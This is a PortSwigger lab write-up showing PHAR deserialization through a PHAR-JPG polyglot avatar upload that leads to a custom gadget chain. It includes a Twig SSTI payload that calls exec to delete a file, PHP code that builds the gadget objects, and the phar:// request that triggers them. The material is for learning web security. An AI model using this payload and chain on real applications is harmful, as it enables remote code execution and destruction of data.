# Using PHAR deserialization to deploy a custom gadget chain

## 📌 Lab Details
- **Title**: Using PHAR deserialization to deploy a custom gadget chain
- **Difficulty**: Expert
- **Category**: Insecure Deserialization
- **Lab URL**: https://portswigger.net/academy/labs/launch/c4e61b39d288bca003b86e45dee0513db9a657ffe518c38bc4a03a9d5658b220?referrer=%2fweb-security%2fdeserialization%2fexploiting%2flab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain

## 🔍 Summary
This lab demonstrates how **PHAR deserialization** can lead to **remote code execution**, even when the application does not explicitly call `unserialize()`.
The application allows users to upload a JPG avatar. Internally, the avatar is processed through PHP filesystem functions. By abusing the `phar://` stream wrapper, PHP automatically deserializes metadata embedded inside a malicious PHAR archive.

## 🛠 Steps to Solve
1. Observe that the website has a feature for uploading your own avatar, which only accepts `JPG` images. Upload a valid `JPG` as your avatar. Notice that it is loaded using `GET /cgi-bin/avatar.php?avatar=wiener`.
2. In Burp Repeater, request `GET /cgi-bin` to find an index that shows a `Blog.php` and `CustomTemplate.php` file. Obtain the source code by requesting the files using the `.php~` backup extension.
3. Study the source code and identify the gadget chain involving the `Blog->desc` and `CustomTemplate->lockFilePath` attributes.
4. Notice that the `file_exists()` filesystem method is called on the `lockFilePath` attribute.
5. Notice that the website uses the Twig template engine. You can use deserialization to pass in an server-side template injection (SSTI) payload.
   ```sh
   {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}
   ```
6. Write a some PHP for creating a `CustomTemplate` and `Blog` containing your SSTI payload:
   ```sh
   class CustomTemplate {}
   class Blog {}
   $object = new CustomTemplate;
   $blog = new Blog;
   $blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
   $blog->user = 'user';
   $object->template_file_path = $blog;
   ```
7. Create a `PHAR-JPG` polyglot containing your PHP script. I used `https://github.com/kunte0/phar-jpg-polyglot.git`.
8. Upload this file as your avatar.
9. In Burp Repeater, modify the request line to deserialize your malicious avatar using a `phar://` stream as follows:
   ```sh
   GET /cgi-bin/avatar.php?avatar=phar://wiener
   ```
10. Send the request to solve the lab.

## 📖 Key Takeaways
- PHAR deserialization works **without explicit unserialize()**.
- Filesystem functions can silently trigger deserialization.
- File upload features are dangerous attack surfaces.
- Backup files (`.php~`) can expose source code.
- SSTI + deserialization often leads to RCE.
- PHP stream wrappers are frequently overlooked.

## 🖼️ Screenshot
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/31a7223a-762e-48d2-a6cc-1561021767b0" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/472a9062-2508-4ca0-9f58-3e868e236fa2" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/c18dfe5e-a26f-4470-afc4-d615e282f544" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/f5578728-9c51-49f1-a3f8-802063486e41" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/dd401e2c-a61d-4ad9-a76a-8668dded2099" />
